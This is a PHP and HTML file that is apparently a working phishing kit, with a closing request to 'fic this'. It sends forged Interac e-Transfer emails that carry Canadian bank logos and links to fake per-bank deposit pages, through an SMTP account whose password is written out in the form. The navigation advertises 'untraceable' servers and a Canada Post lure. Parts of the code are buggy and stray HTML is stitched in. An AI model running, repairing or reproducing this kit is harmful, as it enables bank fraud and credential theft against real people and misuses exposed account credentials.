
<?php 


use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require ("PHPMailer/src/PHPMailer.php");
require ("PHPMailer/src/SMTP.php");
require ("PHPMailer/src/Exception.php");

$template = file_get_contents('transfer.html');
$message = str_replace('{{expiredate}}', $_POST['expiredate'], $template);
$message = str_replace('{{username}}', $_POST['username'], $template);
$message = str_replace('{{photo_href}}', $_POST['photo_href'], $message);
$message = str_replace('{{bank}}', $_POST['bank'], $message);
$message = str_replace('{{amount}}', $_POST['amount'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{EXPIRE}}', $_POST['EXPIRE'], $message);
$message = str_replace('{{expiredate}}', $_POST['expiredate'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{photo_link}}', $_POST['photo_link'], $message);
$message = str_replace('{{sender_name}}', $_POST['sender_name'], $message);
$message = str_replace('{{receiver_name}}', $_POST['receiver_name'], $message);
$message = str_replace('{{receiver_email}}', $_POST['receiver_email'], $message);


$mail = new PHPMailer(); 
$mail->IsSMTP(); 
$mail->SMTPSecure = 'tsl';
$mail->Host = $_POST['host'];
$mail->Port = $_POST['port']; 
$mail->Body = $message; // use $message instead of $template
$mail->SMTPAuth = true; 
$mail->Username = $_POST['username']; 
$mail->Password = $_POST['password']; 
$mail->SetFrom('triplex@gpnet.ca', $_POST['sender_name']); 
$mail->AddAddress($_POST['receiver_email']); 
$mail->Subject = 'INTERAC e-Transfer: '.$_POST['sender_name'].' sent you money.';
$mail->IsHTML(true); 
$mail->CharSet="utf-8";

if(!$mail->Send()) {  
    echo "Mailer Error: " . $mail->ErrorInfo;
} 

?>

<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PHP Mailer System</title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
<style>
    /* CSS design optimized for iPhones */
    body {
        font-family: Arial, sans-serif;
        font-size: 16px;
        color: #333333;
        background-color: #f2f2f2;
    }
    #container {
        width: 90%;
        max-width: 600px;
        margin: 0 auto;
        background-color: #ffffff;
        padding: 20px;
        border-radius: 5px;
    }
    input[type="text"], textarea {
        width: 100%;
        padding: 12px;
        border: 1px solid #ccc;
        border-radius: 4px;
        box-sizing: border-box;
        margin-top: 6px;
        margin-bottom: 16px;
        resize: vertical;
    }
    input[type="submit"] {
        background-color: #4CAF50;
        color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        .error {
            color: #ff0000;
        }
    </style>
</head>
<body>

<h1 style="text-align: center;">ONLINE TRANS-GENDER </h1>
<form  action="submit.php" method="POST" enctype="multipart/form-data">
<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
	  <button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
	    <span class="navbar-toggler-icon"></span>
	  </button>
	  UN-TRACEABLE CLOUD SERVERS
	  <div class="navbar-collapse collapse" id="navbarNav" style="">
	    <center><ul class="navbar-nav">
	      <li class="nav-item active">
	        <a class="nav-link" href="./DA.php">DASHBOARD</a>
	      </li>
	      <li class="nav-item">
	        <a class="nav-link" href="./index.php">SARAH-V2</a>
	      </li>
	      <li class="nav-item">
	        <a class="nav-link" href="./can/040147.php">Canada Post</a>
	      </li>
       <li class="nav-item">
	        <a class="nav-link" href="./PR.php">PROFILES</a>
	      </li>
       <li class="nav-item">
	
	        <a class="nav-link" href="./GO.php">META GEN</a>
	      </li><li class="nav-item">
	        <a class="nav-link" href="./GR.php">T-GEN</a>
	      </li>
	    </ul></center>
	  </div>
	  
	</nav>
 <fieldset>
<center>MOD AS NEEDED</center>
<input type="text"   id="search"  name="link" value="INPUT LINK DO NOT PUT / AT END"  required><br> 
<input type="text"   id="search"  name="receiver_email" value="swiftrynx@gmail.com"  required>
<input type="text"   name="receiver_name" value="One-time Contact" required>
<input type="text"   name="sender_name" value="AB201293 LTD." required>
<input type="text"   name="amount" Value="100.00" step="0.01"  required>
<input type="text"   name="expiredate" Value="May 13, 2023" required>

    <select name="photo_link" id="photo_link">

<option value="https://etransfer-content.interac.ca/en/logo_CA000002.png">Scotiabank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000001.png">BMO</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000003.png">RBC</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000010.png">CIBC</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000219.png">ATB Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000004.png">TD</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000292.png">National Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000045.png">Desjardins</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000118.png">Laurentian Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000062.png">HSBC</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000344.png">Simplii Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000007.png">Tangerine</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000308.png">EQ Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000310.png">Motusbank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000315.png">FirstOntario Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000238.png">Meridian Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000343.png">Manulife Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000346.png">Motive Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000324.png">Alterna Savings</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000210.png">Bridgewater Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000311.png">Oaken Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000341.png">Zag Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000016.png">President's Choice Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000217.png">Servus Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000314.png">Westminster Savings Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000325.png">Christian Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000331.png">Vancity Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000332.png">Valley First Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000338.png">Mountain View Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000345.png">Connect First Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000071.png">ICICI Bank Canada</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000129.png">National Bank Direct Brokerage</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000174.png">Caisse Financial Group</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000188.png">State Bank of India (Canada)</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000205.png">Bridgeway National</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000212.png">AcceleRate Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000239.png">First Calgary Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000244.png">Tandia Financial Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000254.png">DUCA Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000256.png">Envision Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000271.png">Interior Savings Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000279.png">Kindred Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000290.png">Northern Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000309.png">Steinbach Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000326.png">Synergy Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000340.png">Your Neighbourhood Credit Union</option>
</select>


<select name="bank" id="bank">
      <option value="Scotia Bank">Scotia Bank</option>
      <option value="Bank of Montreal">Bank of Montreal</option>
      <option value="CIBC">CIBC</option>
      <option value="RBC Royal Bank">RBC Royal Bank</option>
      <option value="ATB Financial">ATB Financial</option>
      <option value="TD Canada Trust">TD Canada Trust</option>
      <option value="HSBC Bank Canada">HSBC Bank Canada</option>
      <option value="National Bank of Canada">National Bank of Canada</option>
      <option value="Desjardins">Desjardins</option>
      <option value="Laurentian Bank of Canada">Laurentian Bank of Canada</option>
      <option value="Manulife Bank of Canada">Manulife Bank of Canada</option>
      <option value="Tangerine Bank">Tangerine Bank</option>
      <option value="Alterna Bank">Alterna Bank</option>
      <option value="Bridgewater Bank">Bridgewater Bank</option>
      <option value="Canadian Tire Bank">Canadian Tire Bank</option>
      <option value="Equitable Bank">Equitable Bank</option>
      <option value="First Nations Bank of Canada">First Nations Bank of Canada</option>
      <option value="Haventree Bank">Haventree Bank</option>
      <option value="Motus">Motusbank</option>
      <option value="Peoples Trust Company">Peoples Trust Company</option>
      <option value="Simplii Financial">Simplii Financial</option>
      <option value="Vancity">Vancity</option>
    </select>

    <select name="photo_href" id="photo_href">
    <option value="/public/deposit/sco/928460.php">Scotiabank</option>
<option value="/public/deposit/simplii/928460.php">Simplii Financial</option>
<option value="/public/deposit/bmo/928460.php">Bank of Montreal</option>
<option value="/public/deposit/cibc/928460.php">CIBC</option>
<option value="/public/deposit/rbc/928460.php">RBC Royal Bank</option>
<option value="/public/deposit/atb/928460.php">ATB Financial</option>
<option value="/public/deposit/td/928460.php">TD Canada Trust</option>
<option value="/public/deposit/hsbc/928460.php">HSBC Bank Canada</option>
<option value="/public/deposit/nbc/928460.php">National Bank of Canada</option>
<option value="/public/deposit/desj/928460.php">Desjardins</option>
<option value="/public/deposit/laur/928460.php">Laurentian Bank of Canada</option>
<option value="/public/deposit/manu/928460.php">Manulife Bank of Canada</option>
<option value="/public/deposit/tang/928460.php">Tangerine Bank</option>
<option value="/public/deposit/alterna/928460.php">Alterna Bank</option>
<option value="/public/deposit/bridgewater/928460.php">Bridgewater Bank</option>
<option value="/public/deposit/canadiantire/928460.php">Canadian Tire Bank</option>
<option value="/public/deposit/equitable/928460.php">Equitable Bank</option>
<option value="/public/deposit/firstnations/928460.php">First Nations Bank of Canada</option>
<option value="/public/deposit/haventree/928460.php">Haventree Bank</option>
<option value="/public/deposit/motus/928460.php">Motusbank</option>
<option value="/public/deposit/peoples-trust/928460.php">Peoples Trust Company</option>
<option value="/public/deposit/simplii/928460.php">Simplii Financial</option>
<option value="/public/deposit/vancity/928460.php">Vancity</option>
      </select>
<!DOCTYPE html>
<html>
  <head>
    <title>Canadian Banks Online Banking Sign-Up Forms</title>
  </head>
  <body>
    <h1>Canadian Banks Online Banking Sign-Up Forms</h1>
    <ul>


  </select><input type="submit" value="Submit">

<center>DONT EDIT THIS </center>
<input type="text"       name="port"     value="587"              required>
<input type="text"       name="username"   value="triplex@gpnet.ca" required>
<input type="password"   name="password" value="Triplex2020!"     required>
<input type="text"       name="host"     value="mail.gpnet.ca"    required>
</body></html>
fic this
